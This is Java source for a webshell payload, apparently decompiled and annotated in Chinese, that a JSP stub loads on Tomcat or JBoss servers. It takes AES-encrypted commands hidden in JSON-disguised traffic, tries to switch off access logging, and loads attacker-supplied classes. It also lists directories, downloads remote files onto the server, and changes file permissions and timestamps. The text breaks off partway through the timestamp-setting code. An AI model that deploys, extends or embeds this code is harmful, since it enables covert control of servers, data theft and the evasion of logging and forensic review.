// Source code is decompiled from a .class file using FernFlower decompiler.
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintStream;
import java.io.RandomAccessFile;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.BasicFileAttributes;
import java.nio.file.attribute.FileTime;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import javax.imageio.ImageIO;


/**
 * 这是一个功能强大的Java Webshell Payload，旨在通过反射和自定义类加载器在各种J2EE环境（如Tomcat, JBoss等）中执行命令、管理文件、操作数据库等。
 * 它被设计成一个独立的类，可以被另一个stub（例如一个JSP文件）加载并实例化。
 * Payload通过重写equals和toString方法来接收输入、执行操作并返回结果。
 */
public class mainPayload_aes_base64_json extends ClassLoader {
   // 用于Base64编码的字符集
   public static final char[] toBase64 = new char[]{'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
   
   // ===== 静态类缓存，用于减少反射中的重复类查找 =====
   static Class class$0;  // byte[].class
   static Class class$1;  // ByteArrayOutputStream.class
   static Class class$2;  // String.class
   static Class class$3;  // File.class
   static Class class$4;  // BasicFileAttributeView.class
   static Class class$5;  // Object.class
   static Class class$6;  // System.class
   static Class class$7;  // Map.class
   static Class class$8;  // DriverManager.class
   static Class class$9;  // List.class
   static Class class$10; // Driver.class
   
   // ===== 动态配置（从JSP传入） =====
   String sc = "rebeyond";  // 密钥
   String pm = "pass"; // 参数名
   
   // ===== 实例变量 =====
   // 存储从客户端请求中解析出的参数
   HashMap parameterMap = new HashMap();
   // 存储在HTTP会话中的共享数据，如动态加载的类
   HashMap sessionMap;
   // Servlet上下文对象，用于获取应用信息如真实路径
   Object servletContext;
   // Servlet请求对象
   Object servletRequest;
   // HTTP会话对象
   Object httpSession;
   // 从请求中获取的原始加密数据
   byte[] requestData;
   // Servlet响应对象
   Object servletResponse;
   // 用于捕获和返回执行结果的输出流
   ByteArrayOutputStream outputStream;

   public mainPayload_aes_base64_json() {
   }

   public mainPayload_aes_base64_json(ClassLoader loader) {
      super(loader);
   }

    /**
     * 定义一个新的类从字节数组。
     * @param b 类的字节码。
     * @return 定义的类对象。
     */
   public Class g(byte[] b) {
      return super.defineClass(b, 0, b.length);
   }

    /**
     * 根据传入的参数动态执行相应的方法。
     * 这是payload的核心调度器。
     * @return 执行结果的字节数组。
     */
   public byte[] run() {
      String className = this.get("evalClassName"); // 获取要执行的类名
      String methodName = this.get("methodName"); // 获取要执行的方法名
      if (methodName != null) {
         ByteArrayOutputStream stream;
         PrintStream printStream;
         Class var10000;
         if (className == null) {
            // 如果没有指定类名，则在当前payload类中查找并执行方法
            try {
               Method method = this.getClass().getMethod(methodName, (Class[])null);
               var10000 = method.getReturnType();
               Class var10001 = class$0;
               if (var10001 == null) {
                  try {
                     var10001 = Class.forName("[B");
                  } catch (ClassNotFoundException var6) {
                     throw new NoClassDefFoundError(var6.getMessage());
                  }

                  class$0 = var10001;
               }

               // 检查返回类型是否为byte[]
               return var10000.isAssignableFrom(var10001) ? (byte[])method.invoke(this, (Object[])null) : "this method returnType not is byte[]".getBytes();
            } catch (Exception var7) {
               // 捕获异常并返回堆栈信息
               stream = new ByteArrayOutputStream();
               printStream = new PrintStream(stream);
               var7.printStackTrace(printStream);
               printStream.flush();
               printStream.close();
               return stream.toByteArray();
            }
         } else {
            // 如果指定了类名，则从session中加载该类并执行
            try {
               Class evalClass = (Class)this.sessionMap.get(className);
               if (evalClass == null && this.httpSession != null) {
                  evalClass = (Class)this.sessionMap.get(className);
               }

               if (evalClass != null) {
                  Object object = evalClass.newInstance();
                  object.equals(this.parameterMap); // 传递参数
                  object.toString(); // 执行
                  Object resultObject = this.parameterMap.get("result"); // 获取结果
                  if (resultObject != null) {
                     var10000 = class$0;
                     if (var10000 == null) {
                        try {
                           var10000 = Class.forName("[B");
                        } catch (ClassNotFoundException var8) {
                           throw new NoClassDefFoundError(var8.getMessage());
                        }

                        class$0 = var10000;
                     }

                     return var10000.isAssignableFrom(resultObject.getClass()) ? (byte[])resultObject : "return typeErr".getBytes();
                  } else {
                     return new byte[0];
                  }
               } else {
                  return "evalClass is null".getBytes();
               }
            } catch (Exception var9) {
               stream = new ByteArrayOutputStream();
               printStream = new PrintStream(stream);
               var9.printStackTrace(printStream);
               printStream.flush();
               printStream.close();
               return stream.toByteArray();
            }
         }
      } else {
         return "method is null".getBytes();
      }
   }

    /**
     * 解析请求数据。请求数据是经过GZIP压缩的自定义格式，
     * 格式为：[key] \x02 [4-byte length] [value]。
     */
   public void formatParameter() {
      byte[] parameterByte = this.requestData;
      ByteArrayInputStream tStream = new ByteArrayInputStream(parameterByte);
      ByteArrayOutputStream tp = new ByteArrayOutputStream();
      String key = null;
      byte[] lenB = new byte[4];
      byte[] data = null;

      try {
         GZIPInputStream inputStream = new GZIPInputStream(tStream);

         while(true) {
            while(true) {
               byte t = (byte)inputStream.read();
               if (t == -1) {
                  tp.close();
                  tStream.close();
                  inputStream.close();
                  return;
               }

               if (t == 2) {
                  key = new String(tp.toByteArray());
                  inputStream.read(lenB);
                  int len = bytesToInt(lenB);
                  data = new byte[len];
                  int readOneLen = 0;

                  while((readOneLen += inputStream.read(data, readOneLen, data.length - readOneLen)) < data.length) {
                  }

                  this.parameterMap.put(key, data);
                  tp.reset();
               } else {
                  tp.write(t);
               }
            }
         }
      } catch (Exception var11) {
      }
   }

    /**
     * 重写equals方法，这是payload的入口点之一。
     * 当外部调用者（如JSP）创建payload实例并调用其equals方法时，此方法被触发。
     * 它负责初始化上下文、解析参数，并为后续的命令执行做准备。
     * @param obj 传入的对象，通常是Servlet API对象（如request, pageContext）或数据流。
     * @return 如果初始化成功并准备好执行命令，返回true；否则返回false。
     */
   public boolean equals(Object obj) {
      if (obj != null) {
         if (this.handle(obj)) {
            this.formatParameter(); // 解析参数
            this.noLog(this.servletContext); // 尝试禁用访问日志
            return true;
         } else if (obj instanceof ByteArrayOutputStream) {
            this.outputStream = (ByteArrayOutputStream) obj;
            return false;
         }
      }
      return false;
   }

    /**
     * 处理传入的各种对象，从中提取Servlet上下文（Request, Session, ServletContext等）。
     * 这是一个非常关键的方法，它使得payload能够适应不同的Java Web环境。
     * @param obj 可能是HttpServletRequest, HttpSession, PageContext等对象。
     * @return 如果成功提取到requestData，则返回true。
     */
   public boolean handle(Object obj) {
      if (obj == null) {
         return false;
      } else {
         Class var10000 = class$1;
         if (var10000 == null) {
            try {
               var10000 = Class.forName("java.io.ByteArrayOutputStream");
            } catch (ClassNotFoundException var7) {
               throw new NoClassDefFoundError(var7.getMessage());
            }

            class$1 = var10000;
         }

         if (var10000.isAssignableFrom(obj.getClass())) {
            this.outputStream = (ByteArrayOutputStream)obj;
            return false;
         } else {
            if (this.supportClass(obj, "%s.servlet.http.HttpServletRequest")) {
               this.servletRequest = obj;
            } else if (this.supportClass(obj, "%s.servlet.ServletRequest")) {
               this.servletRequest = obj;
            } else {
               var10000 = class$0;
               if (var10000 == null) {
                  try {
                     var10000 = Class.forName("[B");
                  } catch (ClassNotFoundException var6) {
                     throw new NoClassDefFoundError(var6.getMessage());
                  }

                  class$0 = var10000;
               }

               if (var10000.isAssignableFrom(obj.getClass())) {
                  this.requestData = (byte[])obj;
               } else if (this.supportClass(obj, "%s.servlet.http.HttpSession")) {
                  this.httpSession = obj;
               }
            }

            this.handlePayloadContext(obj);
            if (this.getSessionAttribute("sessionMap") != null) {
               this.sessionMap = (HashMap)this.getSessionAttribute("sessionMap");
            } else {
               this.sessionMap = new HashMap();
               this.setSessionAttribute("sessionMap", this.sessionMap);
            }

            if (this.servletRequest != null) {
               Object var10001 = this.servletRequest;
               Class[] var10003 = new Class[1];
               Class var10006 = class$2;
               if (var10006 == null) {
                  try {
                     var10006 = Class.forName("java.lang.String");
                  } catch (ClassNotFoundException var5) {
                     throw new NoClassDefFoundError(var5.getMessage());
                  }

                  class$2 = var10006;
               }

               var10003[0] = var10006;
               Object retVObject = this.getMethodAndInvoke(var10001, "getAttribute", var10003, new Object[]{"parameters"});
               if (retVObject != null) {
                  var10000 = class$0;
                  if (var10000 == null) {
                     try {
                        var10000 = Class.forName("[B");
                     } catch (ClassNotFoundException var4) {
                        throw new NoClassDefFoundError(var4.getMessage());
                     }

                     class$0 = var10000;
                  }

                  if (var10000.isAssignableFrom(retVObject.getClass())) {
                     this.requestData = (byte[])retVObject;
                  }
               }
            }
            // 如果requestData还是null，尝试从servletRequest中获取并解密第二阶段通信数据
            if (this.requestData == null && this.servletRequest != null) {
               this.requestData = this.decryptSecondStageRequest();
            }

            if (this.requestData == null) {
               return false;
            } else {
               this.parameterMap.put("sessionMap", this.sessionMap);
               this.parameterMap.put("servletRequest", this.servletRequest);
               this.parameterMap.put("servletContext", this.servletContext);
               this.parameterMap.put("httpSession", this.httpSession);
               return true;
            }
         }
      }
   }

    /**
     * 通过请求标记从请求体中提取加密数据
     * @param requestBody 完整请求体
     * @param cookieValue 动态cookie值
     * @return 提取到的加密数据，失败时返回null
     */
    private String extractEncryptedDataFromRequestBody(String requestBody, String cookieValue) {
      try {
          if (requestBody == null || requestBody.isEmpty()) {
              return null;
          }
          
          // 生成期望的请求标记
          String[] requestMarkers = generateDynamicMarkers(cookieValue + "REQ_MARKER", this.sc);
          String leftMarker = requestMarkers[0];
          String rightMarker = requestMarkers[1];
          
          // 先尝试直接在请求体中查找标记
          int leftPos = requestBody.indexOf(leftMarker);
          if (leftPos >= 0) {
              int rightPos = requestBody.indexOf(rightMarker, leftPos + leftMarker.length());
              if (rightPos >= 0) {
                  // 提取标记之间的加密数据
                  int startPos = leftPos + leftMarker.length();
                  String encryptedData = requestBody.substring(startPos, rightPos);
                  return encryptedData;
              }
          }
          
          return null;
      } catch (Exception e) {
          return null;
      }
  }

   /**
     * 从请求体中提取完整内容（支持多种格式）
     * @return 请求体内容，失败时返回null
     */
    private String getRequestBody() {
      try {
          if (this.servletRequest == null) {
              return null;
          }
          
          // 尝试通过BufferedReader获取请求体（更可靠的方法）
          try {
              Object reader = this.getMethodAndInvoke(this.servletRequest, "getReader", null, null);
              if (reader != null) {
                  StringBuilder body = new StringBuilder();
                  String line;
                  while ((line = (String) this.getMethodAndInvoke(reader, "readLine", null, null)) != null) {
                      body.append(line);
                  }
                  this.getMethodAndInvoke(reader, "close", null, null);
                  return body.toString();
              }
          } catch (Exception readerEx) {
              // 如果Reader方法失败，尝试InputStream方法
          }
          
          // 备用方法：通过InputStream获取请求体
          Object inputStream = this.getMethodAndInvoke(this.servletRequest, "getInputStream", null, null);
          if (inputStream == null) {
              return null;
          }
          
          ByteArrayOutputStream buffer = new ByteArrayOutputStream();
          byte[] readBuffer = new byte[1024];
          Object result;
          
          while ((result = this.getMethodAndInvoke(inputStream, "read", new Class[]{byte[].class}, new Object[]{readBuffer})) != null) {
              int bytesRead = ((Number) result).intValue();
              if (bytesRead == -1) {
                  break;
              }
              buffer.write(readBuffer, 0, bytesRead);
          }
          
          this.getMethodAndInvoke(inputStream, "close", null, null);
          return buffer.toString("UTF-8");
          
      } catch (Exception e) {
          return null;
      }
  }
  
  /**
     * 从请求中获取指定cookie的值
     * @param cookieName cookie名称
     * @return cookie值，未找到时返回null
     */
    private String getCookieValue(String cookieName) {
      try {
          if (this.servletRequest == null) {
              return null;
          }
          
          // 获取cookies数组
          Object cookies = this.getMethodAndInvoke(this.servletRequest, "getCookies", null, null);
          if (cookies == null) {
              return null;
          }
          
          // cookies是一个数组，遍历查找指定名称的cookie
          if (cookies.getClass().isArray()) {
              Object[] cookieArray = (Object[]) cookies;
              for (Object cookie : cookieArray) {
                  if (cookie != null) {
                      // 获取cookie的name
                      String name = (String) this.getMethodAndInvoke(cookie, "getName", null, null);
                      if (cookieName.equals(name)) {
                          // 获取cookie的value
                          String value = (String) this.getMethodAndInvoke(cookie, "getValue", null, null);
                          return value;
                      }
                  }
              }
          }
          
          return null;
      } catch (Exception e) {
          return null;
      }
  }

  /**
     * 从请求中获取Content-Type头
     * @return Content-Type字符串，未找到时返回null
     */
    private String getContentType() {
      try {
          if (this.servletRequest == null) {
              return null;
          }
          
          // 获取Content-Type头
          Object contentType = this.getMethodAndInvoke(this.servletRequest, "getContentType", null, null);
          return contentType != null ? contentType.toString() : null;
          
      } catch (Exception e) {
          return null;
      }
  }

  
  

   /**
     * 解密第二阶段通信请求 - 支持自定义格式
     * 通过检查Content-Type来决定解析方式：
     * - application/x-www-form-urlencoded：从参数获取加密数据（不含标记）
     * - 其他格式：通过标记从请求体中提取加密数据
     * @return 解密后的字节数组，失败时返回null
     */
    private byte[] decryptSecondStageRequest() {
      try {
          
          // 获取Content-Type头
          String contentType = getContentType();
          boolean isFormRequest = contentType != null && 
                                contentType.toLowerCase().contains("application/x-www-form-urlencoded");
          
          if (isFormRequest) {
              // 表单格式：从参数获取加密内容（不含左右标记）
              if (this.pm != null) {
                  Class[] paramTypes = new Class[1];
                  Class var10006 = class$2;
                  if (var10006 == null) {
                      try {
                          var10006 = Class.forName("java.lang.String");
                      } catch (ClassNotFoundException var5) {
                          throw new NoClassDefFoundError(var5.getMessage());
                      }
                      class$2 = var10006;
                  }
                  paramTypes[0] = var10006;
                  
                  Object encryptedParam = this.getMethodAndInvoke(this.servletRequest, "getParameter", paramTypes, new Object[]{this.pm});
                  if (encryptedParam != null) {
                      String encryptedData = (String) encryptedParam;
                      if (!encryptedData.isEmpty()) {
                          // 表单方式：直接解码和解密（不含标记）
                          byte[] base64DecodedData = base64Decode(encryptedData);
                          if (base64DecodedData != null) {
                              return x(base64DecodedData, false);
                          }
                      }
                  }
              }
          } else {
              // 非表单格式：从请求体中通过标记提取数据
              String requestBody = getRequestBody();
              if (requestBody != null && !requestBody.isEmpty()) {
                  // 获取动态cookie值
                  String cookieValue = getCookieValue("X-Request-ID");
                  
                  // 通过标记提取加密数据
                  String extractedEncryptedData = extractEncryptedDataFromRequestBody(requestBody, cookieValue);
                  
                  if (extractedEncryptedData != null && !extractedEncryptedData.isEmpty()) {
                      // Base64解码
                      byte[] base64DecodedData = base64Decode(extractedEncryptedData);
                      
                      if (base64DecodedData != null) {
                          // AES解密（使用通信密钥sc）
                          byte[] decryptedData = x(base64DecodedData, false);
                          
                          if (decryptedData != null) {
                              return decryptedData;
                          }
                      }
                  }
              }
          }
          
          return null;
          
      } catch (Exception e) {
          // 调试：如果是解密过程出错，返回null而不是错误信息
          // 这样可以避免把错误信息当作有效的解密数据
          return null;
      }
  }

    /**
     * 从传入的对象中智能地提取Servlet API对象。
     * @param obj 可能是PageContext或其他包含Servlet API对象的容器。
     */
   private void handlePayloadContext(Object obj) {
      try {
         Method getRequestMethod = this.getMethodByClass(obj.getClass(), "getRequest", (Class[])null);
         Method getServletContextMethod = this.getMethodByClass(obj.getClass(), "getServletContext", (Class[])null);
         Method getSessionMethod = this.getMethodByClass(obj.getClass(), "getSession", (Class[])null);
         Method getResponseMethod = this.getMethodByClass(obj.getClass(), "getResponse", (Class[])null);
         if (getRequestMethod != null && this.servletRequest == null) {
            this.servletRequest = getRequestMethod.invoke(obj, (Object[])null);
         }

         if (getServletContextMethod != null && this.servletContext == null) {
            this.servletContext = getServletContextMethod.invoke(obj, (Object[])null);
         }

         if (getSessionMethod != null && this.httpSession == null) {
            this.httpSession = getSessionMethod.invoke(obj, (Object[])null);
         }
         
         if (getResponseMethod != null && this.servletResponse == null) {
             this.servletResponse = getResponseMethod.invoke(obj, (Object[])null);
         }

      } catch (Exception var5) {
      }

   }

    /**
     * 检查一个对象是否是给定接口（如javax.servlet.http.HttpServletRequest）的实例。
     * 同时兼容 'javax.*' 和 'jakarta.*' 两种Servlet API包名。
     * @param obj 要检查的对象。
     * @param classNameString 类名的格式化字符串，例如 "%s.servlet.http.HttpServletRequest"。
     * @return 如果是，返回true。
     */
   private boolean supportClass(Object obj, String classNameString) {
      if (obj == null) {
         return false;
      } else {
         boolean ret = false;
         Class c = null;

         try {
            if ((c = getClass(String.format(classNameString, "javax"))) != null) {
               ret = c.isAssignableFrom(obj.getClass());
            }

            if (!ret && (c = getClass(String.format(classNameString, "jakarta"))) != null) {
               ret = c.isAssignableFrom(obj.getClass());
            }
         } catch (Exception var6) {
         }

         return ret;
      }
   }

    /**
     * 生成带标记的JSON响应字符串的通用方法
     * @param data 要加密的数据
     * @return 带标记的加密JSON响应字符串，失败时返回null
     */
    private String generateMarkedJsonResponse(byte[] data) {
        try {
            
            
            // 生成动态标记
            String[] markers;
            String dynamicCookieValue = getCookieValue("X-Request-ID");
            markers = generateDynamicMarkers(dynamicCookieValue, this.sc);
            
            String leftMarker = markers[0];
            String rightMarker = markers[1];
            
            // AES加密
            byte[] encryptedData = x(data, true);
            if (encryptedData == null) {
                return null;
            }
            
            // Base64编码
            String encodedData = base64Encode(encryptedData);
            
            // 构造完整响应：左标记 + 加密数据 + 右标记
            String markedResponse = leftMarker + encodedData + rightMarker;
            
            // 将payload数据包装成JSON格式进行伪装
            return createJsonResponse(markedResponse);
            
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * 设置JSON响应头并输出内容的通用方法
     * @param jsonContent JSON内容
     */
    private void outputJsonResponse(String jsonContent) {
        try {
            this.servletResponse.getClass().getMethod("setHeader", new Class[]{String.class, String.class}).invoke(this.servletResponse, "Content-Type", "application/json;charset=UTF-8");
            Object outputsStream = this.servletResponse.getClass().getMethod("getWriter", (Class[])null).invoke(this.servletResponse, (Object[])null);
            if (outputsStream != null) {
                outputsStream.getClass().getMethod("write", new Class[]{String.class}).invoke(outputsStream, new Object[]{jsonContent});
                outputsStream.getClass().getMethod("flush", (Class[])null).invoke(outputsStream, (Object[])null);
            }
        } catch (Exception e) {
            // 输出操作失败，但不影响返回值
        }
    }

    /**
     * 重写toString方法，这是payload的另一个入口点，主要用于返回执行结果。
     * 在调用equals()完成初始化和命令执行后，外部调用者（如JSP）会调用此方法来获取结果。
     * 此方法负责执行命令、生成动态标记、进行GZIP压缩、AES加密和Base64编码，并返回完整响应。
     * @return 带有动态标记的完整加密响应字符串：leftMarker + encryptedBase64Data + rightMarker
     */
    public String toString() {
        try {
            ByteArrayOutputStream temOut = this.outputStream == null ? new ByteArrayOutputStream() : this.outputStream;
            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(temOut);
            if (this.parameterMap.get("evalNextData") != null) {
                this.run();
                this.requestData = (byte[])this.parameterMap.get("evalNextData");
                this.parameterMap.clear();
                this.parameterMap.put("httpSession", this.httpSession);
                this.parameterMap.put("servletRequest", this.servletRequest);
                this.parameterMap.put("servletContext", this.servletContext);
                this.formatParameter();
            }

            // 执行命令并获取结果
            byte[] commandResult = this.run();
            gzipOutputStream.write(commandResult);
            gzipOutputStream.close();
            
            // 获取压缩后的结果
            byte[] gzippedResult = temOut.toByteArray();
            temOut.close();

            // 生成动态标记和完整JSON响应
            String jsonResponse = generateMarkedJsonResponse(gzippedResult);
            if (jsonResponse != null) {
               try {
                  this.servletResponse.getClass().getMethod("setHeader", new Class[]{String.class, String.class}).invoke(this.servletResponse, "Content-Type", "application/json;charset=UTF-8");
                  Object outputsStream = this.servletResponse.getClass().getMethod("getWriter", (Class[])null).invoke(this.servletResponse, (Object[])null);
                  if (outputsStream != null) {
                      outputsStream.getClass().getMethod("write", new Class[]{String.class}).invoke(outputsStream, new Object[]{jsonResponse});
                      outputsStream.getClass().getMethod("flush", (Class[])null).invoke(outputsStream, (Object[])null);
                  }
              } catch (Exception e) {
                  // 输出操作失败，但不影响返回值
              }
                
            } else {
                // 如果没有配置，输出传统格式（向后兼容）
                try {
                    this.servletResponse.getClass().getMethod("setHeader", new Class[]{String.class, String.class}).invoke(this.servletResponse, "Content-Type", "text/plain;charset=UTF-8");
                    Object outputsStream = this.servletResponse.getClass().getMethod("getWriter", (Class[])null).invoke(this.servletResponse, (Object[])null);
                    if (outputsStream != null) {
                        String plainResponse = base64Encode(gzippedResult);
                        outputsStream.getClass().getMethod("write", new Class[]{String.class}).invoke(outputsStream, new Object[]{plainResponse});
                        outputsStream.getClass().getMethod("flush", (Class[])null).invoke(outputsStream, (Object[])null);
                    }
                } catch (Exception e) {
                    // 输出操作失败，忽略
                }
            }
            this.requestData = null;
        } catch (Exception var4) {
            // 出错时返回加密的错误信息
            try {
                byte[] errorData = ("ERROR:" + var4.getMessage()).getBytes();
                String jsonErrorResponse = generateMarkedJsonResponse(errorData);
                if (jsonErrorResponse != null) {
                  try {
                     this.servletResponse.getClass().getMethod("setHeader", new Class[]{String.class, String.class}).invoke(this.servletResponse, "Content-Type", "application/json;charset=UTF-8");
                     Object outputsStream = this.servletResponse.getClass().getMethod("getWriter", (Class[])null).invoke(this.servletResponse, (Object[])null);
                     if (outputsStream != null) {
                         outputsStream.getClass().getMethod("write", new Class[]{String.class}).invoke(outputsStream, new Object[]{jsonErrorResponse});
                         outputsStream.getClass().getMethod("flush", (Class[])null).invoke(outputsStream, (Object[])null);
                     }
                 } catch (Exception e) {
                     // 输出操作失败，但不影响返回值
                 }
                } else {
                    // 输出纯文本错误信息
                    try {
                        this.servletResponse.getClass().getMethod("setHeader", new Class[]{String.class, String.class}).invoke(this.servletResponse, "Content-Type", "text/plain;charset=UTF-8");
                        Object outputsStream = this.servletResponse.getClass().getMethod("getWriter", (Class[])null).invoke(this.servletResponse, (Object[])null);
                        if (outputsStream != null) {
                            outputsStream.getClass().getMethod("write", new Class[]{String.class}).invoke(outputsStream, new Object[]{"ERROR:" + var4.getMessage()});
                            outputsStream.getClass().getMethod("flush", (Class[])null).invoke(outputsStream, (Object[])null);
                        }
                    } catch (Exception e) {
                        // 输出操作失败，忽略
                    }
                }
            } catch (Exception e) {
                // 最终错误处理
                try {
                    this.servletResponse.getClass().getMethod("setHeader", new Class[]{String.class, String.class}).invoke(this.servletResponse, "Content-Type", "text/plain;charset=UTF-8");
                    Object outputsStream = this.servletResponse.getClass().getMethod("getWriter", (Class[])null).invoke(this.servletResponse, (Object[])null);
                    if (outputsStream != null) {
                        outputsStream.getClass().getMethod("write", new Class[]{String.class}).invoke(outputsStream, new Object[]{"FATAL_ERROR"});
                        outputsStream.getClass().getMethod("flush", (Class[])null).invoke(outputsStream, (Object[])null);
                    }
                } catch (Exception ex) {
                    // 最终输出失败，忽略
                }
            }
        }

        this.parameterMap.clear();
        return "";
    }
 
    /**
     * 从参数映射中获取一个字符串类型的值。
     * @param key 参数名。
     * @return 参数值。
     */
   public String get(String key) {
      try {
         return new String((byte[])this.parameterMap.get(key));
      } catch (Exception var3) {
         return null;
      }
   }

    /**
     * 从参数映射中获取一个字节数组类型的值。
     * @param key 参数名。
     * @return 参数值。
     */
   public byte[] getByteArray(String key) {
      try {
         return (byte[])this.parameterMap.get(key);
      } catch (Exception var3) {
         return null;
      }
   }

    /**
     * 一个简单的测试方法，用于检查payload是否成功加载并可以调用。
     * @return "ok"的字节数组。
     */
   public byte[] test() {
      return "ok".getBytes();
   }

    /**
     * 列出指定目录的文件和子目录。
     * @return 格式化的文件列表字符串的字节数组。
     * 格式: ok\n[绝对路径]\n[文件名]\t[类型(0:目录,1:文件)]\t[修改时间]\t[大小]\t[权限]\n...
     */
   public byte[] getFile() {
      String dirName = this.get("dirName");
      if (dirName != null) {
         dirName = dirName.trim();
         String buffer = new String();

         try {
            String currentDir = (new File(dirName)).getAbsoluteFile() + "/";
            File[] files = (new File(currentDir)).listFiles();
            buffer = buffer + "ok";
            buffer = buffer + "\n";
            buffer = buffer + currentDir;
            buffer = buffer + "\n";

            for(int i = 0; i < files.length; ++i) {
               File file = files[i];

               try {
                  buffer = buffer + file.getName();
                  buffer = buffer + "\t";
                  buffer = buffer + (file.isDirectory() ? "0" : "1");
                  buffer = buffer + "\t";
                  buffer = buffer + (new SimpleDateFormat("yyyy-MM-dd HH:mm:ss")).format(new Date(file.lastModified()));
                  buffer = buffer + "\t";
                  buffer = buffer + Integer.toString((int)file.length());
                  buffer = buffer + "\t";
                  StringBuffer var10000 = (new StringBuffer(String.valueOf(file.canRead() ? "R" : ""))).append(file.canWrite() ? "W" : "");
                  Class var10002 = class$3;
                  if (var10002 == null) {
                     try {
                        var10002 = Class.forName("java.io.File");
                     } catch (ClassNotFoundException var9) {
                        throw new NoClassDefFoundError(var9.getMessage());
                     }

                     class$3 = var10002;
                  }

                  String fileState = var10000.append(this.getMethodByClass(var10002, "canExecute", (Class[])null) != null ? (file.canExecute() ? "X" : "") : "").toString();
                  buffer = buffer + (fileState != null && fileState.trim().length() != 0 ? fileState : "F");
                  buffer = buffer + "\n";
               } catch (Exception var10) {
                  buffer = buffer + var10.getMessage();
                  buffer = buffer + "\n";
               }
            }
         } catch (Exception var11) {
            return String.format("dir does not exist errMsg:%s", var11.getMessage()).getBytes();
         }

         return buffer.getBytes();
      } else {
         return "No parameter dirName".getBytes();
      }
   }

    /**
     * 列出系统的所有磁盘根目录（例如 "C:;D:;" 或 "/;").
     * @return 以分号分隔的根目录列表字符串。
     */
   public String listFileRoot() {
      File[] files = File.listRoots();
      String buffer = new String();

      for(int i = 0; i < files.length; ++i) {
         buffer = buffer + files[i].getPath();
         buffer = buffer + ";";
      }

      return buffer;
   }

    /**
     * 从指定的URL远程下载文件并保存到服务器。
     * @return "ok"的字节数组如果成功，否则返回错误信息。
     */
   public byte[] fileRemoteDownload() {
      String url = this.get("url"); // 远程文件URL
      String saveFile = this.get("saveFile"); // 在服务器上保存的路径
      if (url != null && saveFile != null) {
         FileOutputStream outputStream = null;

         try {
            InputStream inputStream = (new URL(url)).openStream();
            outputStream = new FileOutputStream(saveFile);
            byte[] data = new byte[5120]; // 5KB缓冲区
            int readNum;

            while((readNum = inputStream.read(data)) != -1) {
               outputStream.write(data, 0, readNum);
            }

            outputStream.flush();
            inputStream.close();
            return "ok".getBytes();
         } catch (Exception var8) {
            if (outputStream != null) {
               try {
                  outputStream.close();
               } catch (IOException var7) {
                  return var7.getMessage().getBytes();
               }
            }

            return String.format("%s : %s", var8.getClass().getName(), var8.getMessage()).getBytes();
         }
      } else {
         return "url or saveFile is null".getBytes();
      }
   }

    /**
     * 修改文件属性，如权限和时间戳。
     * @return "ok"或错误信息的字节数组。
     */
   public byte[] setFileAttr() {
      String type = this.get("type"); // "fileBasicAttr" 或 "fileTimeAttr"
      String attr = this.get("attr"); // 权限(R,W,X)或时间戳
      String fileName = this.get("fileName");
      String ret = "Null";
      if (type != null && attr != null && fileName != null) {
         try {
            File file = new File(fileName);
            Class var10001;
            if ("fileBasicAttr".equals(type)) {
               var10001 = class$3;
               if (var10001 == null) {
                  try {
                     var10001 = Class.forName("java.io.File");
                  } catch (ClassNotFoundException var16) {
                     throw new NoClassDefFoundError(var16.getMessage());
                  }

                  class$3 = var10001;
               }

               if (this.getMethodByClass(var10001, "setWritable", new Class[]{Boolean.TYPE}) != null) {
                  file.setReadable(attr.contains("R"));
                  file.setWritable(attr.contains("W"));
                  file.setExecutable(attr.contains("X"));

                  ret = "ok";
               } else {
                  ret = "Java version is less than 1.6";
               }
            } else if ("fileTimeAttr".equals(type)) {
               var10001 = class$3;
               if (var10001 == null) {
                  try {
                     var10001 = Class.forName("java.io.File");
                  } catch (ClassNotFoundException var15) {
                     throw new NoClassDefFoundError(var15.getMessage());
                  }

                  class$3 = var10001;
               }

               if (this.getMethodByClass(var10001, "setLastModified", new Class[]{Long.TYPE}) != null) {
                  // 解析时间属性参数，支持格式：修改时间|访问时间
                  String[] timeValues = attr.split("\\|");
                  
                  // 如果只有一个值，表示设置修改时间（保持向后兼容）
                  if (timeValues.length == 1) {
                     Date date = new Date(0L);
                     StringBuilder builder = new StringBuilder();
                     builder.append(attr);
                     char[] cs = new char[13 - builder.length()];
                     Arrays.fill(cs, '0');
                     builder.append(cs);
                     date = new Date(date.getTime() + Long.parseLong(builder.toString()));
                     file.setLastModified(date.getTime());
                     ret = "ok";
                  } else if (timeValues.length == 2) {
                     // 处理两个时间值：[修改时间, 访问时间]
                     Date modificationTime = null;
                     Date accessTime = null;
                     
                     // 解析修改时间
                     if (!"none".equals(timeValues[0]) && timeValues[0].trim().length() > 0) {
                        StringBuilder builder = new StringBuilder();
                        builder.append(timeValues[0]);
                        char[] cs = new char[13 - builder.length()];
                        Arrays.fill(cs, '0');
                        builder.append(cs);
                        modificationTime = new Date(Long.parseLong(builder.toString()));
                        // 设置文件修改时间
                        file.setLastModified(modificationTime.getTime());
                     }
                     
                     // 解析访问时间
                     if (!"none".equals(timeValues[1]) && timeValues[1].trim().length() > 0) {
